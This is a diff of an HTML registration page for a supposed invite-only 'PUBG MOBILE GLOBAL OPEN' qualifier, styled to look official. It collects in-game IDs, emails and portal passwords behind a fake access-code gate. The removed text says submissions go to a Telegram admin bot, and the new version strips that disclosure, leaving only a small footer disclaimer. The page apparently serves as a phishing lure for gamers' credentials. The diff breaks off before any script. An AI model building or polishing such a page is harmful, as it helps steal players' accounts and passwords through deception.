@@ -1,672 +1,527 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <title>ESPORT PUBG MOBILE — Registration Hub (register)</title>
+  <meta charset="UTF-8" />
+  <title>ESPORT PUBG MOBILE — Registration Hub (register)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Early access registration hub for PUBG MOBILE esports projects, slots and partnerships." />
+  <meta name="keywords" content="pubg mobile esports, registration, early access, tournaments" />
+  <link rel="canonical" href="https://esportpubgmobile.com/soon.html" />
 
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description"
-          content="Early access registration hub for PUBG MOBILE esports projects, slots and partnerships." />
-    <meta name="keywords"
-          content="pubg mobile esports, registration, early access, tournaments" />
+  <!-- Favicon / app icons (НЕ ТРОГАЕМ) -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="apple-touch-icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="shortcut icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" type="image/png" />
 
-    <link rel="canonical" href="https://esportpubgmobile.com/soon.html" />
+  <style>
+    :root{
+      --bg-main:#020814;
+      --bg-card:#0b101c;
+      /* 🆕 мягкая подложка для карточек */
+      --bg-card-soft:
+        radial-gradient(120% 140% at 10% 0%, rgba(255,184,0,.06), transparent 40%),
+        radial-gradient(120% 140% at 100% 100%, rgba(255,138,0,.05), transparent 45%),
+        linear-gradient(180deg, rgba(8,12,20,.85), rgba(5,8,14,.92));
+      --accent:#ffb800; --accent-alt:#ff8a00;
+      --text:#fff; --muted:#9ca3af;
+      --shadow:0 18px 70px rgba(0,0,0,.78);
+      --r-xl:26px; --r-lg:20px; --r-full:999px;
+      --t:.2s ease;
+      --font:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif
+    }
 
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" sizes="32x32" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
-    <link rel="icon" type="image/png" sizes="192x192" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
-    <link rel="apple-touch-icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
-    <link rel="shortcut icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" type="image/png" />
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      background:radial-gradient(circle at top,#141b33 0%,#020814 55%,#00040a 100%);
+      color:var(--text);
+      font-family:var(--font)
+    }
+    a{color:inherit;text-decoration:none}
+    img{display:block;max-width:100%}
+    .page{min-height:100vh;display:flex;flex-direction:column}
+    .inner{width:min(1200px,100% - 40px);margin:0 auto}
 
-    <style>
-        :root {
-            --bg-main: #020814;
-            --bg-header: #020814;
-            --bg-card: #0b101c;
-            --bg-card-soft: #111827;
-            --accent: #ffb800;
-            --accent-alt: #ff8a00;
-            --accent-soft: rgba(255,184,0,.16);
-            --accent-green: #22c55e;
-            --accent-green-soft: rgba(34,197,94,0.16);
-            --text-main: #ffffff;
-            --text-soft: #e5e7eb;
-            --text-muted: #9ca3af;
-            --radius-xl: 26px;
-            --radius-lg: 20px;
-            --radius-full: 999px;
-            --shadow-soft: 0 18px 70px rgba(0,0,0,0.78);
-            --font-main: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            --transition-fast: .2s ease;
-        }
+    /* header */
+    .header-wrap{
+      position:sticky;top:0;z-index:50;
+      backdrop-filter:blur(18px);
+      background:rgba(0,0,0,.85);
+      border-bottom:1px solid rgba(255,255,255,.06)
+    }
+    .header{display:flex;align-items:center;justify-content:space-between;padding:10px 0 8px}
+    .logo{display:flex;align-items:center;gap:10px}
+    .logo-square{
+      width:34px;height:34px;border-radius:12px;position:relative;overflow:hidden;background:#040810;
+      box-shadow:0 0 0 1px rgba(255,184,0,.22),0 0 18px rgba(255,184,0,.45)
+    }
+    .logo-square::after{
+      content:"";position:absolute;inset:4px;
+      background:url("/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png") center/contain no-repeat;
+      filter:drop-shadow(0 1px 3px rgba(0,0,0,.9))
+    }
+    .logo .txt{line-height:1.05}
+    .logo .txt .top{display:flex;gap:4px;font-weight:800;font-size:14px;letter-spacing:.08em;color:var(--accent)}
+    .logo .txt .sub{font-size:8px;letter-spacing:.16em;text-transform:uppercase;color:#9ca3af}
 
-        * { box-sizing: border-box; }
+    .nav{display:flex;gap:10px;font-size:9px;text-transform:uppercase;letter-spacing:.14em;color:#cbd5e1}
+    .nav a{padding:6px 10px;border-radius:var(--r-full);border:1px solid transparent;transition:all var(--t)}
+    .nav a:hover{color:var(--accent);border-color:rgba(255,184,0,.2);background:rgba(255,184,0,.06)}
+    .nav .nav-soon{color:#22c55e;border-color:#22c55e33;background:#071219;box-shadow:0 0 16px #22c55e73;font-weight:700}
+    .nav .nav-soon:hover{transform:translateY(-1px)}
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: var(--font-main);
-            background: radial-gradient(circle at top, #141b33 0%, #020814 55%, #00040a 100%);
-            color: var(--text-main);
-            -webkit-font-smoothing: antialiased;
-        }
+    /* HERO: фоновый OPEN баннер */
+    .hero{padding:18px 0 6px}
+    .hero-wrap{position:relative;border-radius:26px;overflow:hidden;box-shadow:var(--shadow);background:#020814}
+    .hero-img{width:100%}
+    .hero-overlay{
+      position:absolute;left:18px;bottom:16px;padding:8px 10px;border-radius:18px;
+      background:rgba(0,0,0,.88);display:inline-flex;flex-direction:column;gap:3px
+    }
+    .hero-tag{display:inline-flex;align-items:center;gap:7px;padding:4px 9px;border-radius:999px;background:#000c;border:1px solid rgba(255,184,0,.26);font-size:8px;letter-spacing:.16em;color:var(--accent);text-transform:uppercase}
+    .hero-tag .dot{width:6px;height:6px;border-radius:999px;background:var(--accent);box-shadow:0 0 8px rgba(255,184,0,.9)}
+    .hero-title{font-size:16px;font-weight:800;letter-spacing:.16em;text-transform:uppercase}
+    .hero-sub{font-size:8px;letter-spacing:.12em;opacity:.9}
 
-        a { color: inherit; text-decoration: none; }
-        img { display: block; max-width: 100%; }
+    /* АНОНС ПО ЦЕНТРУ (баннер 123414112131.png + подпись CIS) */
+    .announce{display:flex;justify-content:center;padding:10px 0 12px}
+    .announce-card{
+      width:min(860px,100%);
+      border-radius:22px;overflow:hidden;
+      /* 🆕 используем мягкую подложку */
+      background:var(--bg-card-soft, var(--bg-card));
+      border:1px solid rgba(255,255,255,.06);
+      box-shadow:var(--shadow);
+      text-align:center
+    }
+    .announce-card img{width:100%;height:auto;display:block}
+    .announce-body{padding:12px 14px 14px}
+    .announce-title{font-size:14px;text-transform:uppercase;letter-spacing:.18em;margin:0 0 6px}
+    .announce-sub{font-size:9px;color:var(--muted);letter-spacing:.14em;margin-bottom:10px}
 
-        .page { min-height: 100vh; display: flex; flex-direction: column; }
-        .inner { width: min(1320px, 100% - 40px); margin: 0 auto; }
+    .btn{
+      padding:8px 14px;border-radius:999px;border:1px solid rgba(255,184,0,.8);
+      background:#0b101c;color:var(--accent);font-size:8.5px;text-transform:uppercase;letter-spacing:.16em;cursor:pointer;transition:all var(--t)
+    }
+    .btn:hover{background:linear-gradient(90deg,var(--accent-alt),var(--accent));color:#000}
 
-        /* HEADER */
-        .header-wrap {
-            position: sticky; top: 0; z-index: 50; backdrop-filter: blur(18px);
-            background: radial-gradient(circle at top, rgba(0,0,0,0.88), rgba(2,8,20,0.98));
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-        }
-        .header { display: flex; align-items: center; justify-content: space-between; gap: 24px; padding: 10px 0 8px; }
-        .logo-combo { display: inline-flex; align-items: center; gap: 10px; }
-        .wb_element.wb_element_shape { width: 34px; height: 34px; flex-shrink: 0; }
-        .wb_element.wb_element_shape .wb_shp {
-            width: 100%; height: 100%; border-radius: 12px; position: relative; overflow: hidden;
-            background: radial-gradient(circle at 30% 0, rgba(255,184,0,0.35), transparent), #040810;
-            box-shadow: 0 0 0 1px rgba(255,184,0,0.22), 0 0 18px rgba(255,184,0,0.45);
-        }
-        .wb_element.wb_element_shape .wb_shp::after {
-            content: ""; position: absolute; inset: 4px;
-            background: url("/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png") center center / contain no-repeat;
-            filter: drop-shadow(0 1px 3px rgba(0,0,0,0.9));
-        }
-        .logo-text-block { display: flex; flex-direction: column; line-height: 1.05; }
-        .logo-text-block .top-line { display: flex; gap: 4px; font-weight: 800; font-size: 14px; letter-spacing: 0.08em; color: var(--accent); }
-        .logo-text-block .sub-line { font-size: 8px; letter-spacing: 0.16em; text-transform: uppercase; color: #9ca3af; }
+    /* Секции / форма */
+    .section{padding:14px 0 20px}
+    .title{font-size:12px;text-transform:uppercase;letter-spacing:.18em;margin-bottom:7px}
+    .title .bar{display:inline-block;width:28px;height:2px;background:var(--accent);margin-right:7px;border-radius:999px;vertical-align:middle}
+    .sub{font-size:8.5px;color:#cbd5e1;max-width:520px;margin-bottom:12px}
 
-        .nav { display: flex; flex-wrap: wrap; gap: 10px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.14em; color: var(--text-muted); }
-        .nav a { padding: 6px 10px; border-radius: var(--radius-full); border: 1px solid transparent; transition: all var(--transition-fast); }
-        .nav a:hover { color: var(--accent); border-color: var(--accent-soft); background: rgba(255,184,0,0.06); }
-        .nav a.nav-primary { color: var(--accent); border-color: var(--accent); background: rgba(255,184,0,0.08); box-shadow: 0 0 14px rgba(255,184,0,0.35); }
-        .nav a.nav-soon {
-            color: var(--accent-green); border-color: rgba(34,197,94,0.9);
-            background: radial-gradient(circle at top, var(--accent-green-soft), transparent), rgba(3,7,18,0.98);
-            box-shadow: 0 0 16px rgba(34,197,94,0.45); font-weight: 700;
-        }
-        .nav a.nav-soon:hover {
-            transform: translateY(-1px); box-shadow: 0 0 22px rgba(34,197,94,0.65);
-            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92)); color: #020817;
-        }
+    .card{
+      padding:14px;border-radius:26px;
+      /* 🆕 мягкий фон карточек */
+      background:var(--bg-card-soft, var(--bg-card));
+      border:1px solid rgba(255,255,255,.06);
+      box-shadow:var(--shadow)
+    }
 
-        /* HERO: MAIN TOURNAMENT BANNER */
-        .hero { padding: 18px 0 4px; }
-        .soon-hero-wrap {
-            position: relative; border-radius: 26px; overflow: hidden; box-shadow: var(--shadow-soft); background: #020814;
-        }
-        .soon-hero-img { width: 100%; display: block; }
-        .soon-hero-overlay {
-            position: absolute; left: 18px; bottom: 16px; padding: 8px 10px; border-radius: 18px;
-            background: radial-gradient(circle at top left, rgba(0,0,0,0.98), rgba(0,0,0,0.9));
-            display: inline-flex; flex-direction: column; gap: 3px;
-        }
-        .soon-label {
-            display: inline-flex; align-items: center; gap: 7px; padding: 4px 9px; border-radius: var(--radius-full);
-            background: rgba(0,0,0,0.96); border: 1px solid rgba(255,184,0,0.26); font-size: 8px; letter-spacing: 0.16em; text-transform: uppercase; color: var(--accent);
-        }
-        .soon-label span.dot { width: 6px; height: 6px; border-radius: 999px; background: var(--accent); box-shadow: 0 0 8px rgba(255,184,0,0.9); }
-        .soon-hero-title { font-size: 16px; font-weight: 800; letter-spacing: 0.16em; text-transform: uppercase; color: #ffffff; }
-        .soon-hero-sub { font-size: 8px; letter-spacing: 0.12em; text-transform: uppercase; color: #e5e7eb; opacity: 0.9; }
+    .row{display:flex;flex-wrap:wrap;gap:9px;align-items:center;margin-bottom:9px}
+    .label{font-size:7px;text-transform:uppercase;letter-spacing:.16em;color:#94a3b8;margin-bottom:2px}
+    .input-wrap{flex:1;min-width:140px}
+    input{
+      width:100%;padding:7px 9px;border-radius:14px;border:1px solid rgba(148,163,253,.12);
+      background:#040710;color:#e5e7eb;font-size:9px;outline:none;transition:all var(--t)
+    }
+    input::placeholder{color:#94a3b8aa}
+    input:focus{border-color:var(--accent);box-shadow:0 0 10px rgba(255,184,0,.22)}
+    .status{margin-top:5px;font-size:8px}
+    .ok{color:#22c55e}.err{color:#f97316}
 
-        /* NEW: TOURNAMENT ICON UNDER BANNER */
-        .tournament-icon{
-            display:flex; align-items:center; gap:12px; padding:10px 2px 8px;
-        }
-        .tournament-icon .badge{
-            width:64px; height:64px; border-radius:20px; overflow:hidden;
-            background:#0f172a; border:1px solid rgba(255,255,255,0.08); box-shadow: var(--shadow-soft);
-            flex:0 0 auto;
-        }
-        .tournament-icon .badge img{width:100%; height:100%; object-fit:cover}
-        .tournament-icon .meta{display:flex; flex-direction:column; gap:3px}
-        .tournament-icon .meta .name{font-size:13px; text-transform:uppercase; letter-spacing:.18em}
-        .tournament-icon .meta .sub{font-size:8px; color:var(--text-muted); letter-spacing:.12em}
+    .grid-2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px}
+    @media (max-width:768px){
+      .grid-2{grid-template-columns:1fr}
+      .nav{display:none}
+    }
 
-        /* TOURNAMENT DESCRIPTION UNDER BANNER */
-        .tournament-section { padding: 8px 0 10px; }
-        .tournament-card {
-            padding: 14px 14px 12px; border-radius: var(--radius-xl);
-            background: var(--bg-card); border: 1px solid rgba(255,255,255,0.08); box-shadow: var(--shadow-soft);
-        }
-        .tournament-title { font-size: 13px; text-transform: uppercase; letter-spacing: 0.18em; margin-bottom: 6px; }
-        .tournament-text { font-size: 8.5px; color: var(--text-soft); line-height: 1.7; margin-bottom: 10px; }
-        .tournament-points { margin: 0 0 9px; padding-left: 14px; font-size: 8px; color: var(--text-soft); line-height: 1.6; }
-        .btn-sm {
-            padding: 7px 12px; border-radius: var(--radius-full); border: 1px solid rgba(255,184,0,0.82);
-            background: rgba(7,11,20,0.98); font-size: 7.5px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--accent);
-            cursor: pointer; transition: all var(--transition-fast); display: inline-flex; align-items: center; gap: 5px; white-space: nowrap;
-        }
-        .btn-sm:hover { background: linear-gradient(90deg, var(--accent-alt), var(--accent)); color: #000; box-shadow: 0 10px 20px rgba(0,0,0,1); }
+    .submit{margin-top:9px;display:flex;justify-content:flex-end}
+    .submit-btn{
+      padding:8px 18px;border-radius:999px;border:0;
+      background:linear-gradient(90deg,var(--accent-alt),var(--accent));
+      color:#000;font-size:8px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;
+      cursor:pointer;box-shadow:0 10px 24px rgba(0,0,0,1)
+    }
 
-        /* SECTIONS / FORMS */
-        .section { padding: 14px 0 20px; }
-        .section-title { font-size: 12px; text-transform: uppercase; letter-spacing: 0.18em; margin-bottom: 7px; }
-        .section-title .bar { display: inline-block; width: 28px; height: 2px; background: var(--accent); margin-right: 7px; border-radius: 999px; vertical-align: middle; }
-        .section-sub { font-size: 8.5px; color: var(--text-muted); max-width: 520px; margin-bottom: 12px; }
+    .footer{
+      margin-top:18px;padding:12px 0 18px;font-size:8px;color:#94a3b8;text-align:center;
+      border-top:1px solid rgba(255,255,255,.06);
+      background:radial-gradient(circle at top,rgba(255,184,0,.03),transparent)
+    }
 
-        .card {
-            padding: 14px 14px 12px; border-radius: var(--radius-xl);
-            background: var(--bg-card); border: 1px solid rgba(255,255,255,0.06); box-shadow: var(--shadow-soft);
-        }
-        .code-form-row, .field-row { display: flex; flex-wrap: wrap; gap: 9px; align-items: center; margin-bottom: 9px; }
-        .label { font-size: 7px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--text-muted); margin-bottom: 2px; }
-        .input-wrap { flex: 1; min-width: 140px; }
+    .tg-float{
+      position:fixed;right:18px;bottom:24px;width:42px;height:42px;border-radius:50%;
+      background:#0f172a;box-shadow:0 10px 24px rgba(0,0,0,.9);
+      display:flex;align-items:center;justify-content:center;border:1px solid rgba(255,255,255,.16);
+      z-index:120;transition:all var(--t)
+    }
+    .tg-float:hover{transform:translateY(-3px) scale(1.03);border-color:var(--accent)}
+    .tg-float svg{width:20px;height:20px;fill:#39A9FF}
 
-        input {
-            width: 100%; padding: 7px 9px; border-radius: 14px; border: 1px solid rgba(148,163,253,0.12);
-            background: rgba(4,7,16,0.98); color: var(--text-soft); font-size: 9px; outline: none; transition: all var(--transition-fast);
-        }
-        input::placeholder { color: rgba(148,163,253,0.45); }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(255,184,0,0.22); }
-
-        .note { font-size: 7px; color: var(--text-muted); margin-top: 3px; }
-        .status { margin-top: 5px; font-size: 8px; }
-        .status.ok { color: #22c55e; } .status.err { color: #f97316; }
-
-        .two-cols { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 8px; }
-
-        @media (max-width: 768px) {
-            .two-cols { grid-template-columns: 1fr; }
-            .header { padding: 8px 0 6px; }
-            .nav { display: none; }
-            .soon-hero-title { font-size: 14px; }
-            .soon-hero-sub { font-size: 7px; }
-            .tournament-title { font-size: 11px; }
-        }
-
-        .submit-wrap { margin-top: 9px; display: flex; justify-content: flex-end; }
-        .submit-btn {
-            padding: 8px 18px; border-radius: var(--radius-full); border: 0;
-            background: linear-gradient(90deg, var(--accent-alt), var(--accent)); color: #000; font-size: 8px; font-weight: 700;
-            letter-spacing: 0.18em; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 24px rgba(0,0,0,1);
-            display: inline-flex; align-items: center; gap: 7px;
-        }
-        .submit-btn span.icon { width: 12px; height: 12px; border-radius: 999px; background: #000; color: var(--accent);
-            display: inline-flex; align-items: center; justify-content: center; font-size: 8px; }
-        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 16px 30px rgba(0,0,0,1); }
-
-        .footer {
-            margin-top: 18px; padding: 12px 0 18px; font-size: 8px; color: var(--text-muted); text-align: center;
-            border-top: 1px solid rgba(255,255,255,0.06); background: radial-gradient(circle at top, rgba(255,184,0,0.03), transparent);
-        }
-
-        /* FLOATING TELEGRAM BUTTON */
-        .tg-float {
-            position: fixed; right: 18px; bottom: 24px; width: 42px; height: 42px; border-radius: 50%;
-            background: radial-gradient(circle at 30% 0, rgba(255,255,255,0.16), transparent), #0f172a;
-            box-shadow: 0 10px 24px rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center;
-            cursor: pointer; border: 1px solid rgba(255,255,255,0.16); z-index: 120; transition: all var(--transition-fast);
-        }
-        .tg-float:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 16px 34px rgba(0,0,0,0.95); border-color: var(--accent); }
-        .tg-float svg { width: 20px; height: 20px; fill: #39A9FF; }
-
-        /* SUCCESS ICON */
-        .success-envelope { font-size: 26px; margin-bottom: 4px; }
-    </style>
+    /* Скрываем Step 1 на старте */
+    #code-gate{display:none}
+  </style>
 </head>
 <body>
-<div class="page">
-
+  <div class="page">
     <!-- HEADER -->
     <div class="header-wrap">
-        <div class="inner header">
-            <div class="logo-combo">
-                <div class="wb_element wb_element_shape" data-plugin="Shape"><div class="wb_shp"></div></div>
-                <div class="logo-text-block">
-                    <div class="top-line"><span>ESPORT</span><span>PUBG</span><span>MOBILE</span></div>
-                    <div class="sub-line">REGISTRATION HUB</div>
-                </div>
-            </div>
-
-            <nav class="nav">
-                <a href="/" class="nav-primary">Hub</a>
-                <a href="/#teams">Teams</a>
-                <a href="/#standings">Standings</a>
-                <a href="/#players">Players</a>
-                <a href="/#power-rankings">Power Rank</a>
-                <a href="/#follow">Links</a>
-                <a href="/soon.html" class="nav-soon">Register / Login</a>
-            </nav>
+      <div class="inner header">
+        <div class="logo">
+          <div class="logo-square"></div>
+          <div class="txt">
+            <div class="top"><span>ESPORT</span><span>PUBG</span><span>MOBILE</span></div>
+            <div class="sub">REGISTRATION HUB</div>
+          </div>
         </div>
+        <nav class="nav">
+          <a href="/" class="nav-primary">Hub</a>
+          <a href="/#teams">Teams</a>
+          <a href="/#standings">Standings</a>
+          <a href="/#players">Players</a>
+          <a href="/#power-rankings">Power Rank</a>
+          <a href="/#follow">Links</a>
+          <a href="/soon.html" class="nav-soon">Register / Login</a>
+        </nav>
+      </div>
     </div>
 
     <!-- MAIN -->
     <main>
-        <div class="inner">
+      <div class="inner">
+        <!-- ФОНОВЫЙ OPEN баннер -->
+        <section class="hero">
+          <div class="hero-wrap">
+            <img class="hero-img" src="/172f6786de4f4d5591f3b061f472e935_fit.webp" alt="PUBG MOBILE OPEN">
+            <div class="hero-overlay">
+              <div class="hero-tag"><span class="dot"></span>OFFICIAL STYLE • CLOSED ACCESS</div>
+              <div class="hero-title">PUBG MOBILE OPEN</div>
+              <div class="hero-sub">INVITE-ONLY QUALIFIER GATEWAY</div>
+            </div>
+          </div>
+        </section>
 
-            <!-- HERO: MAIN TOURNAMENT BANNER (switched to your first banner) -->
-            <section class="hero">
-                <div class="soon-hero-wrap">
-                    <img
-                        class="soon-hero-img"
-                        src="/172f6786de4f4d5591f3b061f472e935_fit.webp"
-                        alt="PUBG MOBILE GLOBAL OPEN Banner"
-                    />
-                    <div class="soon-hero-overlay">
-                        <div class="soon-label"><span class="dot"></span>OFFICIAL STYLE • CLOSED ACCESS</div>
-                        <div class="soon-hero-title">PUBG MOBILE GLOBAL OPEN</div>
-                        <div class="soon-hero-sub">INVITE-ONLY GLOBAL QUALIFIER GATEWAY</div>
-                    </div>
+        <!-- АНОНС ТУРНИРА ПО ЦЕНТРУ (CIS) -->
+        <section class="announce" aria-label="Tournament announcement CIS">
+          <div class="announce-card">
+            <img src="/123414112131.png" alt="PUBG MOBILE GLOBAL OPEN — CIS">
+            <div class="announce-body">
+              <h2 class="announce-title">PUBG MOBILE GLOBAL OPEN — <b>CIS</b></h2>
+              <div class="announce-sub">Central registration for CIS region • Closed lobbies • Manual verification</div>
+              <button id="announce-enter" class="btn">Enter registration code</button>
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 1: появится только после клика по кнопке выше -->
+        <section class="section" id="code-gate" aria-hidden="true">
+          <div class="title"><span class="bar"></span>Step 1 — Access Code Verification</div>
+          <div class="sub">Enter your invite code. Valid codes unlock the secure registration form.</div>
+          <div class="card">
+            <div class="row">
+              <div class="input-wrap">
+                <div class="label">Access code</div>
+                <input id="access-code" type="text" placeholder="Enter your invite code (e.g. FLOW2025)" />
+              </div>
+              <button id="check-code" class="btn">Verify code</button>
+            </div>
+            <div id="code-status" class="status"></div>
+            <div class="sub" style="margin:6px 0 0">Codes are controlled by admins. Frontend holds a small demo list.</div>
+          </div>
+        </section>
+
+        <!-- STEP 2: форма — только после валидного кода -->
+        <section class="section" id="registration-section" style="display:none;">
+          <div class="title"><span class="bar"></span>Step 2 — Registration Form</div>
+          <div class="sub">After submission you will be placed into the <b>waiting lobby</b> until manual approval.</div>
+          <form id="reg-form" class="card">
+            <div class="grid-2">
+              <div>
+                <div class="label">Team / Player In-game ID</div>
+                <input type="text" id="ingame-id" required placeholder="PUBG MOBILE numeric ID" />
+              </div>
+              <div>
+                <div class="label">Confirm In-game ID</div>
+                <input type="text" id="ingame-id-confirm" placeholder="Repeat your PUBG MOBILE ID" />
+              </div>
+            </div>
+
+            <div class="grid-2">
+              <div>
+                <div class="label">Email</div>
+                <input type="email" id="email" required placeholder="Your primary contact email" />
+              </div>
+              <div>
+                <div class="label">Password for portal</div>
+                <input type="password" id="password" required placeholder="Create portal password" />
+              </div>
+            </div>
+
+            <div class="grid-2">
+              <div>
+                <div class="label">Repeat password</div>
+                <input type="password" id="password-confirm" required placeholder="Repeat the password" />
+              </div>
+              <div>
+                <div class="label">Email verification code</div>
+                <div class="row" style="margin-bottom:0">
+                  <input type="text" id="email-code" placeholder="Enter code from email (if provided)" />
+                  <button type="button" id="request-email-code" class="btn">Get code</button>
                 </div>
-            </section>
+              </div>
+            </div>
 
-            <!-- TOURNAMENT ICON + SHORT META under banner -->
-            <section class="tournament-icon" aria-label="Tournament identity">
-                <div class="badge">
-                    <!-- Замени на свой отдельный логотип турнира, если есть -->
-                    <img src="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" alt="Tournament Icon">
-                </div>
-                <div class="meta">
-                    <div class="name">PMGO 2025</div>
-                    <div class="sub">Elite Global Open • Closed Lobbies • Manual Verification</div>
-                </div>
-            </section>
+            <div class="row" style="margin-top:6px">
+              <label style="font-size:7px;color:#94a3b8;display:flex;gap:6px;align-items:flex-start;">
+                <input type="checkbox" id="terms" style="width:10px;height:10px;margin-top:2px" required />
+                I confirm that the provided data is accurate and agree to receive notifications about my application status.
+              </label>
+            </div>
 
-            <!-- DESCRIPTION UNDER BANNER + CTA TO CODE -->
-            <section class="tournament-section">
-                <div class="tournament-card">
-                    <div class="tournament-title">PMGO 2025 — ELITE GLOBAL OPEN LOBBY</div>
-                    <div class="tournament-text">
-                        One unified registration hub for trusted rosters, partners and talents.
-                        Entry is protected by invite codes, manual verification and direct
-                        synchronization with the admin panel via Telegram.
-                    </div>
-                    <ul class="tournament-points">
-                        <li>Priority access to scrims, showmatches and closed qualifiers.</li>
-                        <li>Manual screening of rosters to filter out fake lineups &amp; cheaters.</li>
-                        <li>Private distribution of lobby details &amp; tournament documentation.</li>
-                        <li>Fast communication: each request lands directly to the admin bot.</li>
-                    </ul>
-                    <button id="enter-code-btn" class="btn-sm">
-                        <span>ENTER REGISTRATION CODE</span>
-                        <span class="icon">▶</span>
-                    </button>
-                </div>
-            </section>
+            <div id="reg-status" class="status"></div>
+            <div class="submit">
+              <button type="submit" class="submit-btn">Submit application</button>
+            </div>
+          </form>
+        </section>
 
-            <!-- CODE CHECK -->
-            <section class="section" id="code-gate">
-                <div class="section-title"><span class="bar"></span>Step 1 — Access Code Verification</div>
-                <div class="section-sub">
-                    Enter your invite code. Valid codes unlock the secure registration form.
-                    Codes are distributed manually via trusted channels and partners.
-                </div>
-
-                <div class="card">
-                    <div class="code-form-row">
-                        <div class="input-wrap">
-                            <div class="label">Access code</div>
-                            <input id="access-code" type="text" placeholder="Enter your invite code (e.g. FLOW2025)" />
-                        </div>
-                        <button id="check-code" class="btn-sm">VERIFY CODE</button>
-                    </div>
-                    <div id="code-status" class="status"></div>
-                    <div class="note">
-                        Codes list is controlled by admins. Frontend uses a local demo list;
-                        every submitted application is still logged to Telegram for review.
-                    </div>
-                </div>
-            </section>
-
-            <!-- REGISTRATION FORM -->
-            <section class="section" id="registration-section" style="display:none;">
-                <div class="section-title"><span class="bar"></span>Step 2 — Registration Form</div>
-                <div class="section-sub">
-                    After submission your data appears in the admin bot with Approve / Reject buttons.
-                    Until the decision you stay in the <strong>waiting lobby</strong>.
-                </div>
-
-                <form id="reg-form" class="card">
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">Team / Player In-game ID</div>
-                            <input type="text" id="ingame-id" required placeholder="PUBG MOBILE numeric ID" />
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Confirm In-game ID</div>
-                            <input type="text" id="ingame-id-confirm" placeholder="Repeat your PUBG MOBILE ID" />
-                        </div>
-                    </div>
-
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">Email</div>
-                            <input type="email" id="email" required placeholder="Your primary contact email" />
-                            <div class="note">All confirmations and decisions go here.</div>
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Password for portal</div>
-                            <input type="password" id="password" required placeholder="Create portal password" />
-                        </div>
-                    </div>
-
-                    <div class="two-cols">
-                        <div class="field-group">
-                            <div class="label">Repeat password</div>
-                            <input type="password" id="password-confirm" required placeholder="Repeat the password" />
-                        </div>
-                        <div class="field-group">
-                            <div class="label">Email verification code</div>
-                            <div class="code-form-row">
-                                <input type="text" id="email-code" placeholder="Enter code from email (if provided)" />
-                                <button type="button" id="request-email-code" class="btn-sm">GET CODE</button>
-                            </div>
-                            <div class="note">
-                                "GET CODE" sends your basic data to the admin bot.
-                                Admin can verify you and reply with a personal code.
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="field-row">
-                        <label style="font-size:7px; color:var(--text-muted); display:flex; gap:6px; align-items:flex-start;">
-                            <input type="checkbox" id="terms" style="width:10px; height:10px; margin-top:2px;" required />
-                            I confirm that the provided data is accurate and agree to receive
-                            notifications about my application status.
-                        </label>
-                    </div>
-
-                    <div id="reg-status" class="status"></div>
-
-                    <div class="submit-wrap">
-                        <button type="submit" class="submit-btn">
-                            <span class="icon">✓</span>
-                            SUBMIT APPLICATION
-                        </button>
-                    </div>
-                </form>
-            </section>
-
-            <!-- WAITING / FINAL STATUS -->
-            <section class="section" id="final-message" style="display:none;">
-                <div class="card" id="final-card"></div>
-            </section>
-
-        </div>
+        <!-- ФИНАЛЬНЫЙ СТАТУС -->
+        <section class="section" id="final-message" style="display:none;">
+          <div class="card" id="final-card"></div>
+        </section>
+      </div>
     </main>
 
     <!-- FOOTER -->
     <footer class="footer">
-        <div class="inner">
-            ESPORTPUBGMOBILE.COM — Closed registration &amp; early access concept hub.
-            Independent project. Not affiliated with Tencent, Krafton or PUBG MOBILE.
-        </div>
+      <div class="inner">
+        ESPORTPUBGMOBILE.COM — Closed registration &amp; early access concept hub. Independent project. Not affiliated with Tencent, Krafton or PUBG MOBILE.
+      </div>
     </footer>
-</div>
+  </div>
 
-<!-- FLOATING TELEGRAM BUTTON -->
-<a href="https://t.me/v7ck9ll" target="_blank" rel="noopener"
-   class="tg-float" aria-label="Contact @v7ck9ll on Telegram">
+  <!-- TELEGRAM FLOAT -->
+  <a href="https://t.me/v7ck9ll" target="_blank" rel="noopener" class="tg-float" aria-label="Contact @v7ck9ll on Telegram">
     <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="120" cy="120" r="120" fill="none"/>
